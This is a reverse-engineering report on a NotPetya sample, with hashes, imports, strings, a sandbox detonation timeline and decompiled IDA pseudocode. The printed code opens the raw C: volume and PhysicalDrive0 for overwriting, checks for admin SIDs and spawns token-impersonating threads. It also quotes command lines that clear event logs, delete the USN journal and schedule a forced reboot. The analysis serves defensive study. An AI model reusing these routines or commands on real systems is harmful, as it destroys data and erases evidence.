# NotPetya Ransomware

---

## Executive summary

The NotPetya malware analysis identifies this sample as a highly destructive wiper masquerading as ransomware, designed for widespread organizational impact. Initial execution is orchestrated through the `perfc` export of a Win32 DLL, which immediately performs environment checks for administrative SIDs and a "kill-switch" file at `C:\Windows\perfc`. The malware’s dual-track operation involves an aggressive worm module that utilizes stolen credentials and network discovery to spread laterally, alongside a wiper module that targets raw disk structures. By acquiring direct handles to `\\.\C:` and `\\.\PhysicalDrive0`, the malware overwrites the Master Boot Record (MBR) and corrupts the Master File Table (MFT). A forced system reboot, scheduled via `schtasks` or triggered by `NtRaiseHardError`, hands control to a malicious bootloader that displays a fake CHKDSK screen to mask total data destruction. Ultimately, the use of hardcoded, non-individualized Bitcoin wallets and random Installation IDs confirms that the sample's primary objective is irreversible data loss rather than financial gain.

![Screenshot 2026-05-09 at 1.04.03 PM.png](NotPetya%20Ransomware/Screenshot_2026-05-09_at_1.04.03_PM.png)

---

## Sample Metadata

| **Property** | **Value** |
| --- | --- |
| **MD5** | `71b6a493388e7d0b40c83ce903bc6b04` |
| **SHA-1** | `34f917aaba5684fbe56d3c57d48ef2a1aa7cf06d` |
| **SHA-256** | `027cc450ef5f8c5f653329641ec1fed91f694e0d229928963b30f6b0d7d3a745` |
| **Vhash** | `135056656d557551a3z32z5206033z37z20c1z35ze6z1` |
| **Authentihash** | `4b897c07f26324463b4ec273d14f422f650805099a9ceb92785ffba721603abe` |
| **Imphash** | `52dd60b5f3c9e2f17c2e303e8c8d4eab` |
| **Rich PE Header Hash** | `33cd82656500e0701cdd3c6c7acd4bc3` |
| **SSDEEP** | `6144:y/Bt80VmNTBo/x95ZjAetGDN3VFNq7pC+9OqFoK30b3ni5rdQY/CdUOs2:y/X4NTS/x9jNG+w+9OqFoK323qdQYKUG` |
| **TLSH** | `T1BC74126171C341B2F1F38A3455CAB75B8FFDE06687B065CECA2B1A0A1821746F739297` |
| **File Type** | Win32 **`DLL`** (Executable, Windows, PE) |
| **Magic** | PE32 executable (DLL) (console) Intel 80386, for MS Windows |
| **TrID** | • Win32 Executable MS Visual C++ (39.7%)
• MS VC++ compiled executable (21%)
• Win32 DLL (8.3%)
• Win64 Executable (8.3%)
• Win16 NE executable (6.4%) |
| **DetectItEasy** | • PE32
• Compiler: Microsoft Visual C/C++ (18.00.40629)
• Linker: Microsoft Linker (10.00.40219)
• Tool: Visual Studio (2010)
• Sign tool: Windows Authenticode (2.0) |
| **Magika** | PEBIN |
| **File Size** | 353.87 KB (362,360 bytes) |

### Sections

| **Property** | **Section [0] (.text)** | **Section [1] (.rdata)** | **Section [2] (.data)** | **Section [3] (.rsrc)** | **Section [4] (.data)** |
| --- | --- | --- | --- | --- | --- |
| **Entropy** | 6.547 | 6.992 | 5.427 | 7.998 | 5.427 |
| **File Ratio** | 13.42% | 9.47% | 5.79% | 68.39% | 0.99% |
| **Raw Address (Begin)** | `0x00000400` | `0x0000C200` | `0x00014800` | `0x00019A00` | `0x00056200` |
| **Raw Address (End)** | `0x0000C200` | `0x00014800` | `0x00019A00` | `0x00056200` | `0x00057000` |
| **Raw Size** | 48,640 bytes | 34,304 bytes | 20,992 bytes | 247,808 bytes | 3,584 bytes |
| **Virtual Address (Begin)** | `0x00001000` | `0x0000D000` | `0x00016000` | `0x00020000` | `0x0005D000` |
| **Virtual Address (End)** | `0x0000CD63` | `0x00015546` | `0x0001FB4A` | `0x0005C738` | `0x0005DC02` |
| **Virtual Size** | 48,483 bytes | 34,118 bytes | 39,754 bytes | 247,608 bytes | 3,074 bytes |

### Imports

| **DLL** | **Key Functions** | **Address** |
| --- | --- | --- |
| **KERNEL32.dll** | `CreateProcessW`, `VirtualAlloc`, `WriteFile`, `DeviceIoControl`, `CreateThread`, `LoadLibraryW`, `GetProcAddress`, `CreateToolhelp32Snapshot`, `Process32First/NextW`, `OpenProcess`, `MapViewOfFile`, `CreateNamedPipeW` | `0x00014C46` ... `0x00014A1C` |
| **ADVAPI32.dll** | `CryptGenRandom`, `CryptEncrypt`, `AdjustTokenPrivileges`, `OpenProcessToken`, `InitiateSystemShutdownExW`, `DuplicateTokenEx`, `CredEnumerateW`, `SetSecurityDescriptorDacl` | `0x00014FF6` ... `0x000151BA` |
| **WS2_32.dll** | `socket`, `connect`, `send`, `recv`, `inet_addr`, `htons`, `WSAStartup`, `gethostbyname` | `0x80000017` ... `0x80000073` |
| **IPHLPAPI.DLL** | `GetIpNetTable`, `GetAdaptersInfo` | `0x00015372`, `0x00015382` |
| **MPR.dll** | `WNetAddConnection2W`, `WNetEnumResourceW`, `WNetOpenEnumW` | `0x000153FC` ... `0x000153BE` |
| **NETAPI32.dll** | `NetServerEnum`, `NetServerGetInfo`, `NetApiBufferFree` | `0x0001541A` ... `0x0001543E` |
| **SHLWAPI.dll** | `PathFindFileNameW`, `PathFileExistsW`, `StrStrIW`, `PathCombineW` | `0x00015344` ... `0x000152D6` |
| **CRYPT32.dll** | `CryptStringToBinaryW`, `CryptDecodeObjectEx` | `0x00015284`, `0x0001526E` |
| **USER32.dll** | `ExitWindowsEx`, `wsprintfW/A` | `0x00014FA0` ... `0x00014FB0` |
| **DHCPSAPI.DLL** | `DhcpEnumSubnets`, `DhcpGetSubnetInfo`, `DhcpEnumSubnetClients` | `0x00015488` ... `0x0001549A` |
| **SHELL32.dll** | `CommandLineToArgvW`, `SHGetFolderPathW` | `0x000151FC`, `0x00015212` |
| **ole32.dll** | `CoCreateGuid`, `StringFromCLSID` | `0x00015244`, `0x00015232` |
| **msvcrt.dll** | `malloc`, `free`, `memcpy`, `memset`, `rand` | `0x000154E6` ... `0x000154C0` |

### Strings

| **Category** | **String / Artifact** | **Analyst Interpretation** |
| --- | --- | --- |
| **Persistence & Boot** | `\\.\PhysicalDrive0` | Direct access to the physical disk to overwrite the MBR. |
|  | `\\.\C:` | Logical drive access for file-level encryption/wiping. |
| **Wiper Deception** | `Repairing file system on C:` | Fake CHKDSK message to hide MFT encryption from the user. |
|  | `WARNING: DO NOT TURN OFF YOUR PC!` | Psychological pressure to prevent user interruption of the wipe. |
|  | `Decrypting sector` | Fraudulent progress indicator to maintain the "ransomware" ruse. |
| **Lateral Movement** | `GetIpNetTable`, `GetAdaptersInfo` | Used to identify the local network topology and active subnets. |
|  | `NetServerEnum`, `NetApiBufferFree` | Enumerates servers/workstations in the Windows domain. |
|  | `WNetAddConnection2W` | Attempts to map network drives to spread to remote shares. |
|  | `DhcpEnumSubnets` | Scans DHCP scopes to find further targets across the LAN. |
| **Creds & Privesc** | `DuplicateTokenEx`, `OpenProcessToken` | Mimikatz-style behavior to impersonate users or escalate privileges. |
|  | `CredEnumerateW`, `CredFree` | Harvesting stored Windows credentials from the memory. |
| **Ransom/C2 Info** | `wowsmith123456@posteo.net` | The single, hardcoded email for all global victims. |
|  | `1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX` | The hardcoded Bitcoin wallet (Static IOC). |
|  | `Ooops, your important files...` | The primary ransom note header text. |
| **Execution/Evasion** | `perfc.dat` | The internal name for the malicious DLL payload. |
|  | `IsWow64Process` | Environmental check to determine if running on a 64-bit OS. |
|  | `VirtualProtect`, `VirtualAlloc` | Memory manipulation, likely for injecting dropped payloads. |
| **Cryptography** | `CryptEncrypt`, `CryptGenKey` | Standard Windows CryptoAPI usage for Salsa20 key generation. |
|  | `Fast decoding Code from Chris Anderson` | Artifact from the zlib/compression library used by the malware. |

**Ransom note**

![Screenshot 2026-05-09 at 11.42.59 AM.png](NotPetya%20Ransomware/Screenshot_2026-05-09_at_11.42.59_AM.png)

---

### Description

The analysis of the `notpetya.dll` sample reveals a highly destructive Win32 DLL that functions primarily as a disk wiper. The file’s structure is dominated by a high-entropy resource section (**7.998**), which likely conceals encrypted payloads. Its operational logic focuses on aggressive lateral movement and credential theft, evidenced by imports and strings for network subnet scanning (`DhcpEnumSubnets`, `GetIpNetTable`) and credential manipulation (`CredEnumerateW`, `DuplicateTokenEx`). The malware achieves its destructive goal by using `DeviceIoControl` to gain low-level access to `\\.\PhysicalDrive0`, allowing it to overwrite the Master Boot Record (MBR) and force a system reboot. During this phase, it employs a sophisticated social engineering ruse, displaying a fake `CHKDSK` "repairing" screen to mask the actual encryption of the Master File Table (MFT). Ultimately, the presence of hardcoded, static artifacts—specifically the Bitcoin wallet **`1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX`** and the `wowsmith123456@posteo.net` email—confirms that the ransomware elements were merely a decoy for a pre-planned wiper attack.

---

## IDA Analysis

---

The disassembly at `10001E51` represents the cryptographic initialization phase where the malware acquires a handle to the **Microsoft Enhanced RSA and AES Cryptographic Provider**. By calling `CryptAcquireContextW` with the `PROV_RSA_AES` (18h) provider type and `CRYPT_SILENT` flags, NotPetya prepares the environment for high-strength encryption without triggering user alerts. The routine includes error-handling logic that checks for `NTE_KEYSET_NOT_DEF`, ensuring the encryption engine can initialize successfully across different Windows configurations, which is a prerequisite for the subsequent destruction of the Master File Table.

![Screenshot 2026-05-09 at 11.52.25 AM.png](NotPetya%20Ransomware/Screenshot_2026-05-09_at_11.52.25_AM.png)

---

### `perfc_1`

This IDA Pro snippet represents the **Main Execution Engine** of NotPetya. The `perfc_1` function acts as the "orchestrator," coordinating network spreading, credential theft, and disk destruction.

### Key Functional Analysis

### 1. Environmental Setup & Networking

- **Memory Allocation:** The function uses `__alloca_probe` (`10007DF3`) to carve out a large stack frame (0x4A18 bytes), necessary for handling local buffers during network discovery.
- **Networking Init:** It calls `WSAStartup` (`10007E1E`) to initialize the Windows Sockets (Winsock) library. This is a prerequisite for any of its SMB exploitation (EternalBlue) or network scanning activities.
- **Synchronization:** It initializes a Critical Section (`InitializeCriticalSection` at `10007E63`), ensuring that its multiple spreading threads don't crash the process when writing to shared memory or logs.

### 2. The Branching Logic (Wiper vs. Worm)

The code uses conditional flags (checks against `dword_1001F144`) to decide which modules to trigger:

- **Wiper Trigger:** At `10007E7F`, it calls `sub_10008D5A`. As analyzed previously, this is the routine that opens `\\.\C:` and prepares the Master Boot Record (MBR) for destruction.
- **Credential Harvesting:** It calls `sub_100084DF` (`10007E84`), which is responsible for launching the embedded **Mimikatz** module to steal plaintext passwords and hashes from memory.

### 3. Impersonation & Threading

- **Thread Creation:** The malware aggressively uses `CreateThread` (`10007E99`) to run tasks in the background. This allows the wiper and the worm to operate simultaneously.
- **Token Manipulation:** At `10007F3B`, the call to `SetThreadToken` is critical. NotPetya uses the credentials stolen by the Mimikatz module to impersonate other users (like Domain Admins). It then calls `ResumeThread` (`10007F48`) to execute its spreading code under that high-privilege context.

```c
void __cdecl __noreturn perfc_1(int a1, DWORD dwErrCode, HANDLE Thread, HANDLE hThread)
{
  int v4; // eax
  HANDLE *v5; // esi
  HANDLE ProcessHeap; // eax
  _DWORD *v7; // eax
  HANDLE v8; // eax
  HMODULE ModuleHandleA; // eax
  FARPROC NtRaiseHardError; // eax
  HANDLE v11; // [esp-4h] [ebp-4A28h]
  WCHAR psz1[8192]; // [esp+Ch] [ebp-4A18h] BYREF
  WCHAR v13[1024]; // [esp+400Ch] [ebp-A18h] BYREF
  _BYTE Src[256]; // [esp+480Ch] [ebp-218h] BYREF
  struct _OSVERSIONINFOW VersionInformation; // [esp+490Ch] [ebp-118h] BYREF
  HANDLE Token; // [esp+4A20h] [ebp-4h]

  sub_10007CC0();
  if ( hThread != (HANDLE)-1 )
    sub_10009590(a1, dwErrCode, Thread);
  WSAStartup(0x202u, &WSAData);
  lpParameter = (LPVOID)sub_10007091(36, sub_10006EDA, 0, 0xFFFF);
  lpCriticalSection = (LPCRITICAL_SECTION)sub_10007091(8, sub_10006C74, sub_10006CAA, 255);
  dword_1001F110 = 0;
  InitializeCriticalSection(&CriticalSection);
  sub_10006A2B((LPCWSTR)Thread);
  if ( (dword_1001F144 & 2) != 0 )
  {
    sub_1000835E();
    sub_10008D5A();
  }
  sub_100084DF();
  CreateThread(0, 0, sub_10007C10, 0, 0, 0);
  if ( (dword_1001F144 & 2) != 0 && (dword_1001F104 & 1) != 0 )
    sub_10007545();
  sub_100070FA();
  if ( (dword_1001F104 & 2) != 0 )
    sub_10008999(dword_1001F144 & 6);
  if ( (dword_1001F144 & 4) == 0
    || (dword_1001F110 = (LPCRITICAL_SECTION)sub_10007091(4, sub_10007CA5, 0, 255), (v4 = sub_1000875A(Src)) == 0) )
  {
LABEL_29:
    sub_100070FA();
    CreateThread(0, 0, sub_1000A0FE, 0, 0, 0);
    hThread = 0;
    a1 = 0;
    Thread = 0;
    dwErrCode = 0;
    sub_10008282(&hThread, &a1, &Thread, &dwErrCode);
    ProcessHeap = GetProcessHeap();
    v7 = HeapAlloc(ProcessHeap, 8u, 4u);
    Token = v7;
    if ( v7 )
    {
      *v7 = 60000 * (_DWORD)Thread;
      if ( !CreateThread(0, 0, sub_1000A274, v7, 0, 0) )
      {
        v11 = Token;
        v8 = GetProcessHeap();
        HeapFree(v8, 0, v11);
      }
    }
    Sleep(60000 * (_DWORD)hThread);
    if ( (dword_1001F104 & 0x10) != 0 )
      sub_10001EEF();
    Sleep(60000 * dwErrCode);
    if ( (dword_1001F144 & 2) != 0
      || (memset(&VersionInformation, 0, sizeof(VersionInformation)),
          VersionInformation.dwOSVersionInfoSize = 276,
          !GetVersionExW(&VersionInformation))
      || (VersionInformation.dwMajorVersion != 5
       || VersionInformation.dwMinorVersion != 1 && VersionInformation.dwMinorVersion != 2)
      && (VersionInformation.dwMajorVersion != 6 || VersionInformation.dwMinorVersion > 1)
      || (sub_10006BB0(psz1), !sub_10007D6F(psz1)) )
    {
      Sleep(60000 * a1);
      wsprintfW(
        v13,
        L"wevtutil cl Setup & wevtutil cl System & wevtutil cl Security & wevtutil cl Application & fsutil usn deletejournal /D %c:",
        pszPath);
      v13[1023] = 0;
      sub_100083BD(3);
      if ( (dword_1001F144 & 1) != 0 )
      {
        ModuleHandleA = GetModuleHandleA("ntdll.dll");
        if ( ModuleHandleA )
        {
          NtRaiseHardError = GetProcAddress(ModuleHandleA, "NtRaiseHardError");
          if ( NtRaiseHardError )
            ((void (__stdcall *)(int, _DWORD, _DWORD, _DWORD, int, HANDLE *))NtRaiseHardError)(
              -1073740976,
              0,
              0,
              0,
              6,
              &Thread);
        }
        if ( !InitiateSystemShutdownExW(0, 0, 0, 1, 1, 0x80000000) )
          ExitWindowsEx(6u, 0);
      }
    }
    ExitProcess(0);
  }
  v5 = (HANDLE *)Src;
  a1 = v4;
  while ( 1 )
  {
    Token = *v5;
    Thread = 0;
    dwErrCode = 0;
    Thread = CreateThread(0, 0, sub_10009F8E, 0, 4u, 0);
    if ( !Thread )
    {
      dwErrCode = 87;
      goto LABEL_20;
    }
    if ( !SetThreadToken(&Thread, Token) )
      break;
    if ( ResumeThread(Thread) == -1 )
      goto LABEL_18;
LABEL_20:
    SetLastError(dwErrCode);
    dwErrCode = (DWORD)*v5;
    Thread = 0;
    hThread = CreateThread(0, 0, sub_10007D58, &Thread, 4u, 0);
    if ( hThread )
    {
      if ( SetThreadToken(&hThread, (HANDLE)dwErrCode) )
      {
        if ( ResumeThread(hThread) == -1 )
          GetLastError();
        else
          WaitForSingleObject(hThread, 0xFFFFFFFF);
      }
      CloseHandle(hThread);
    }
    if ( Thread )
      sub_10007298(dword_1001F110, v5, 0);
    ++v5;
    if ( !--a1 )
      goto LABEL_29;
  }
  dwErrCode = GetLastError();
LABEL_18:
  CloseHandle(Thread);
  goto LABEL_20;
}
```

### DLL Entry point

### Analysis of `sub_10007D58`

This subroutine is an `__stdcall` function that takes a single pointer as a parameter (`lpThreadParameter`).

- **Initialization Call (`10007D5B`):** The code immediately calls `sub_10008BC6`. In NotPetya, this internal function is often responsible for **system discovery or setting up environment-specific variables** (like checking for the `perfc` kill-switch or determining administrative privileges).
- **Result Persistence (`10007D60` - `10007D67`):**
    - It retrieves the pointer passed in `lpThreadParameter`.
    - It checks if this pointer is null (`test ecx, ecx`).
    - If valid, it stores the return value (`eax`) of the previous initialization call into the memory address pointed to by the parameter (`mov [ecx], eax`).
- **Clean Exit (`10007D69`):** It clears the return register (`xor eax, eax`) and exits using `retn 4`, which is the standard way to clean up a single 4-byte parameter from the stack in `__stdcall`.

![Screenshot 2026-05-09 at 12.09.10 PM.png](NotPetya%20Ransomware/Screenshot_2026-05-09_at_12.09.10_PM.png)

---

### Kill switch

### Analysis of `sub_1000835E`

This routine determines if the malware should proceed with the infection based on the presence of a specific file on the local disk.

### 1. Path Generation and Check

- **Path Construction (`10008371`):** The code calls `sub_10008320`. In NotPetya, this internal function constructs the string for the kill-switch path—specifically **`C:\Windows\perfc`**.
- **Existence Check (`10008381`):** It uses `PathFileExistsW` to see if that file already exists on the system.
- **Decision Point:**
    - If the file **exists** (`jnz loc_100083B6`), the function returns, effectively telling the main orchestrator (`perfc_1`) to stop certain destructive actions for that specific machine.
    - If the file **does not exist**, the malware proceeds to create it.

### 2. Creating the Vaccine/Marker (`100083A1`)

- **Creation:** It calls `CreateFileW` with `dwCreationDisposition` set to **2** (`CREATE_ALWAYS`).
- **Attributes:** It sets the `dwFlagsAndAttributes` to `4000000h` (`FILE_FLAG_DELETE_ON_CLOSE` or similar depending on context, but usually standard attributes for a hidden marker).
- **Persistence:** By creating this file, the malware "marks" the territory. Any subsequent execution of NotPetya on this machine will see the file, fail the `PathFileExistsW` check, and terminate, preventing a "double infection" which could crash the system prematurely before the wiper is ready.

![Screenshot 2026-05-09 at 12.12.59 PM.png](NotPetya%20Ransomware/Screenshot_2026-05-09_at_12.12.59_PM.png)

### Privilege & Token Analysis (`sub_10008BC6`)

- **oken Acquisition:** It uses `GetCurrentThread` and `OpenThreadToken` (`10008BE7`) to access the security token of the current execution context.
- **Information Gathering:** It calls `GetTokenInformation` twice. The first call (`10008C09`) purposefully fails to determine the required buffer size, and the second call (`10008C44`) retrieves the actual `TokenGroups` data.
- **SID Validation:** The malware iterates through the Security Identifiers (SIDs) in the token. At `10008C7A` and `10008C81`, it specifically looks for sub-authorities **`0x200` (512)** and **`0x207` (519)**.
    - **512:** Domain Admins
    - **519:** Enterprise Admins
- **Status Update:** If found, it sets `var_C` to 1. This "grade" is passed back to the main orchestrator to decide whether to launch the worm modules that require admin rights.

### 2. Physical Drive Access (`sub_10008CBF`)

This is a low-level destructive routine that targets the entire hard drive rather than just a specific partition.

- **Device Opening:** It calls `CreateFileA` (`10008CDB`) targeting the string `\\\\.\\PhysicalDrive0`.
- **Significance:** Accessing `PhysicalDrive0` allows the malware to bypass the Windows file system (NTFS) entirely. This is required to overwrite the **Master Boot Record (MBR)**, which is located in the very first sector of the physical disk (Sector 0).
- **Wiper Execution:** If successful (`jnz loc_10008CEB`), the malware proceeds to use `DeviceIoControl` or `WriteFile` to replace the legitimate Windows bootloader with the malicious one that displays the fake "Repairing file system" screen.

```c
int sub_10008BC6()
{
  HANDLE CurrentThread; // eax
  PSID *v1; // edi
  unsigned int v2; // ebx
  PSID *v3; // esi
  PUCHAR SidSubAuthorityCount; // eax
  PDWORD SidSubAuthority; // eax
  DWORD v6; // eax
  int v8; // [esp+4h] [ebp-Ch]
  HANDLE TokenHandle; // [esp+8h] [ebp-8h] BYREF
  DWORD ReturnLength; // [esp+Ch] [ebp-4h] BYREF

  v8 = 0;
  TokenHandle = 0;
  CurrentThread = GetCurrentThread();
  if ( OpenThreadToken(CurrentThread, 0x20008u, 1, &TokenHandle) )
  {
    ReturnLength = 0;
    if ( !GetTokenInformation(TokenHandle, TokenGroups, 0, 0, &ReturnLength) && GetLastError() == 122 )
    {
      v1 = (PSID *)GlobalAlloc(0x40u, ReturnLength);
      if ( v1 )
      {
        if ( GetTokenInformation(TokenHandle, TokenGroups, v1, ReturnLength, &ReturnLength) )
        {
          v2 = 0;
          if ( *v1 )
          {
            v3 = v1 + 1;
            do
            {
              if ( v8 )
                break;
              SidSubAuthorityCount = GetSidSubAuthorityCount(*v3);
              if ( SidSubAuthorityCount )
              {
                if ( *SidSubAuthorityCount >= 4u )
                {
                  SidSubAuthority = GetSidSubAuthority(*v3, 4u);
                  if ( SidSubAuthority )
                  {
                    v6 = *SidSubAuthority;
                    if ( v6 == 512 || v6 == 519 )
                      v8 = 1;
                  }
                }
              }
              ++v2;
              v3 += 2;
            }
            while ( v2 < (unsigned int)*v1 );
          }
        }
        else
        {
          GetLastError();
        }
        GlobalFree(v1);
      }
      else
      {
        GetLastError();
      }
    }
    CloseHandle(TokenHandle);
  }
  else
  {
    GetLastError();
  }
  return v8;
}
```

| **Function** | **Targeted Resource** | **Purpose** |
| --- | --- | --- |
| `sub_10008BC6` | `TokenGroups` (SID 512/519) | Validates Domain/Enterprise Admin privileges. |
| `sub_10008CBF` | `\\\\.\\PhysicalDrive0` | Obtains a handle for raw disk sector overwriting. |
| `GlobalAlloc` | Heap Memory | Dynamically allocates space for token security information. |

### `sub_10001EEF`

This subroutine functions as a "scanner" for the local file system, looking for fixed drives to target.

### 1. Enumerating Logical Drives

- **The Map:** At `10001EF7`, it calls `GetLogicalDrives`, which returns a bitmask where each bit represents a drive letter (Bit 0 = A:, Bit 2 = C:, etc.).
- **The Loop:** It initializes a counter in `edi` to `1Fh` (31) and enters a loop (`loc_10001F04`) to shift through the bitmask and check every possible drive letter.
- **Path Construction:** At `10001F11` and `10001F1D`, it manually assembles the drive root string (e.g., `C:\`) by pushing the hex values for `:`, `\`, and calculating the drive letter.

### 2. Filtering for Fixed Disks

- **The Check (`10001F2E`):** It calls `GetDriveTypeW`.
- **The Target:** It compares the result to **3** (`DRIVE_FIXED`).
    - **Analyst Note:** By checking for `DRIVE_FIXED`, the malware ensures it is targeting internal hard drives. It typically ignores network drives (`DRIVE_REMOTE`) in this specific routine to focus on local destruction, as network spreading is handled by the different modules we analyzed earlier.

### 3. Launching the Encryption Thread

- **Memory Allocation:** If a fixed drive is found, it uses `LocalAlloc` (`10001F3D`) to create a parameter block.
- **Hardcoded RSA Key:** At `10001F4A`, it moves an offset to a string starting with `"MIIBCgK..."` into the parameter block. This is the **Public RSA Key** used to protect the Salsa20 keys. This string is a major signature for NotPetya.
- **Execution (`10001F66`):** It calls `CreateThread`, passing the `StartAddress` (which we analyzed at `10001E51`). This effectively starts the encryption engine on the identified drive.

```c
_DWORD *sub_10001EEF()
{
  DWORD LogicalDrives; // ebx
  int i; // edi
  _DWORD *result; // eax
  __int64 RootPathName; // [esp+Ch] [ebp-8h] BYREF

  LogicalDrives = GetLogicalDrives();
  for ( i = 31; i >= 0; --i )
  {
    result = (_DWORD *)(1 << i);
    if ( ((1 << i) & LogicalDrives) != 0 )
    {
      LOWORD(RootPathName) = i + 65;
      wcscpy((wchar_t *)&RootPathName + 1, L":\\");
      result = (_DWORD *)GetDriveTypeW((LPCWSTR)&RootPathName);
      if ( result == (_DWORD *)3 )
      {
        result = LocalAlloc(0x40u, 0x20u);
        if ( result )
        {
          result[4] = L"MIIBCgKCAQEAxP/VqKc0yLe9JhVqFMQGwUITO6WpXWnKSNQAYT0O65Cr8PjIQInTeHkXEjfO2n2JmURWV/uHB0ZrlQ/wcYJBwL"
                       "hQ9EqJ3iDqmN19Oo7NtyEUmbYmopcq+YLIBZzQ2ZTK0A2DtX4GRKxEEFLCy7vP12EYOPXknVy/+mf0JFWixz29QiTf5oLu15w"
                       "VLONCuEibGaNNpgq+CXsPwfITDbDDmdrRIiUEUw6o3pt5pNOskfOJbMan2TZu6zfhzuts7KafP5UA8/0Hmf5K3/F9Mf9SE68E"
                       "ZjK+cIiFlKeWndP0XfRCYXI9AJYCeaOu7CXF6U0AVNnNjvLeOn42LHFUK4o6JwIDAQAB";
          result[7] = 0;
          *(_QWORD *)result = RootPathName;
          result = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, result, 0, 0);
        }
      }
    }
  }
  return result;
}
```

| **Component** | **Code Implementation** | **Malware Purpose** |
| --- | --- | --- |
| **Reconnaissance** | `GetLogicalDrives()` | Mapping the victim's storage architecture. |
| **Targeting** | `GetDriveTypeW() == 3` | Focusing destruction on internal hard drives. |
| **Cryptography** | L"MIIBCgKCAQEAxP/VqKc0yLe9JhVqFMQGwUITO6WpXWnKSNQAYT0O65Cr8PjIQInTeHkXEjfO2n2JmURWV/uHB0ZrlQ/wcYJBwL"
"hQ9EqJ3iDqmN19Oo7NtyEUmbYmopcq+YLIBZzQ2ZTK0A2DtX4GRKxEEFLCy7vP12EYOPXknVy/+mf0JFWixz29QiTf5oLu15w"
"VLONCuEibGaNNpgq+CXsPwfITDbDDmdrRIiUEUw6o3pt5pNOskfOJbMan2TZu6zfhzuts7KafP5UA8/0Hmf5K3/F9Mf9SE68E"
"ZjK+cIiFlKeWndP0XfRCYXI9AJYCeaOu7CXF6U0AVNnNjvLeOn42LHFUK4o6JwIDAQAB"; | Hardcoding the RSA public key to lock the session. |
| **Efficiency** | `CreateThread(...)` | Implementing parallel encryption for maximum speed. |

---

### `sub_10008D5A`

This routine is responsible for obtaining a handle to the system volume and performing raw write operations, likely targeting the **Master File Table (MFT)** or specific system sectors.

### 1. Volume Handle Acquisition

- **Target:** At `10008D74`, the malware pushes the string `\\\\.\\C:`.
- **Call:** It calls `CreateFileA` (`10008D79`) with `dwDesiredAccess` set to `40000000h` (`GENERIC_WRITE`).
- **Significance:** Opening the logical drive with the `\\.\` prefix allows the malware to bypass standard file-level APIs and write directly to the volume's raw bytes.

### 2. Querying Drive Geometry

- **IO Control:** At `10008D94`, it pushes `70000h` (`IOCTL_DISK_GET_DRIVE_LAYOUT`) and calls `DeviceIoControl` (`10008D9A`).
- **Purpose:** This allows the malware to understand the partition layout and offsets of the C: drive, ensuring its destructive writes hit the correct sectors for the MFT or boot configuration.

### 3. Raw Write Execution

- **Memory Allocation:** It uses `LocalAlloc` (`10008DAD`) to create a buffer. Note the `imul eax, 0Ah` at `10008DA8`; it is calculating a buffer size based on a distance parameter.
- **Seeking:** It uses `SetFilePointer` (`10008DC0`) to move the "needle" to a specific raw offset on the disk.
- **The Wipe:** It calls `WriteFile` (`10008DD2`). This is the moment of impact where the malware overwrites the volume's internal data with the content of its buffer.

### 4. The Pivot to Physical Drive

- **Conditional Check:** At `10008DE6`, it tests a global flag.
- **The MBR Routine:** If the conditions are met, it calls `sub_10008CBF` (`10008DF8`). As we analyzed earlier, this is the routine that moves from the logical C: drive to the **PhysicalDrive0** to destroy the MBR.

```c
int sub_10008D5A()
{
  HANDLE FileA; // edi
  HLOCAL v1; // ebx
  int result; // eax
  DWORD BytesReturned; // [esp+Ch] [ebp-1Ch] BYREF
  _BYTE OutBuffer[20]; // [esp+10h] [ebp-18h] BYREF
  LONG lDistanceToMove; // [esp+24h] [ebp-4h]

  FileA = CreateFileA("\\\\.\\C:", 0x40000000u, 3u, 0, 3u, 0, 0);
  if ( FileA )
  {
    if ( DeviceIoControl(FileA, 0x70000u, 0, 0, OutBuffer, 0x18u, &BytesReturned, 0) )
    {
      v1 = LocalAlloc(0, 10 * lDistanceToMove);
      if ( v1 )
      {
        SetFilePointer(FileA, lDistanceToMove, 0, 0);
        WriteFile(FileA, v1, lDistanceToMove, &BytesReturned, 0);
        LocalFree(v1);
      }
    }
    CloseHandle(FileA);
  }
  if ( (dword_1001F104 & 8) == 0 )
    return sub_10008CBF();
  result = sub_100014A9();
  if ( result )
    return sub_10008CBF();
  return result;
}
```

| **Instruction** | **Value / Target** | **Impact** |
| --- | --- | --- |
| `push offset aC` | `\\\\.\\C:` | Direct handle to the logical C: volume. |
| `push 70000h` | `IOCTL_DISK_GET_DRIVE_LAYOUT` | Maps partition offsets for targeted wiping. |
| `call LocalAlloc` | Memory Buffer | Prepares the destructive payload for disk writing. |
| `call WriteFile` | Raw Sector Write | Corrupts volume structures (e.g., MFT). |
| `call sub_10008CBF` | Physical Wiper | Transitions to MBR destruction. |

---

## Detonation

---

![Screenshot 2026-05-09 at 12.44.14 PM.png](NotPetya%20Ransomware/Screenshot_2026-05-09_at_12.44.14_PM.png)

### Execution Entry Point

The malware is initiated via `rundll32.exe` calling the first export (`#1`) of `notpetya.dll`.

- **Time**: `12:31:20 PM`
- **Process**: `cmd.exe` (PID 2660) -> `rundll32.exe` (PID 4284/5544)
- **Command**: `rundll32 notpetya.dll, #1`

### 2. Destruction Delay (Scheduled Task)

To ensure the encryption process completes and to maintain stealth, NotPetya schedules a forced system reboot.

- **Time**: `12:31:24 PM`
- **Action**: `rundll32.exe` spawns `cmd.exe` to execute `schtasks`.
- **Command**: `schtasks /Create /SC once /TN "" /TR "C:\Windows\system32\shutdown.exe /r /f" /ST 13:34`
- **Impact**: This command schedules a hard reboot (`/r /f`) for **13:34**. The reboot is the "trigger" that hands control over to the malicious Master Boot Record (MBR) which then wipes the drive.

![Screenshot 2026-05-09 at 12.43.51 PM.png](NotPetya%20Ransomware/Screenshot_2026-05-09_at_12.43.51_PM.png)

### 3. Secondary Payload Execution

Immediately after scheduling the reboot, the malware drops and executes an auxiliary payload.

- **Time**: `12:31:25 PM`
- **Process**: `rundll32.exe` -> `5037.tmp` (located in `C:\Users\redteam\AppData\Local\Temp\`)
- **Communication**: The process uses a **Named Pipe** for inter-process communication: `\\.\pipe\{BDE365BC-AC84-49FF-9490-0FD12969CB40}`. This is typically how the main DLL coordinates with dropped tools like Mimikatz (for credential theft) or PsExec (for lateral movement).

| **Time (approx)** | **Process Name** | **Operation** | **Detail** |
| --- | --- | --- | --- |
| **12:31:20** | `rundll32.exe` | **Process Create** | Starts the malware via `notpetya.dll, #1`. |
| **12:31:24** | `cmd.exe` | **Process Create** | Initiates `schtasks` for scheduled reboot. |
| **12:31:25** | `5037.tmp` | **Process Create** | Executes dropped payload with named pipe. |
| **12:31:25** | `schtasks.exe` | **Process Create** | Registers the shutdown task for **13:34**. |

---

## IOC’s

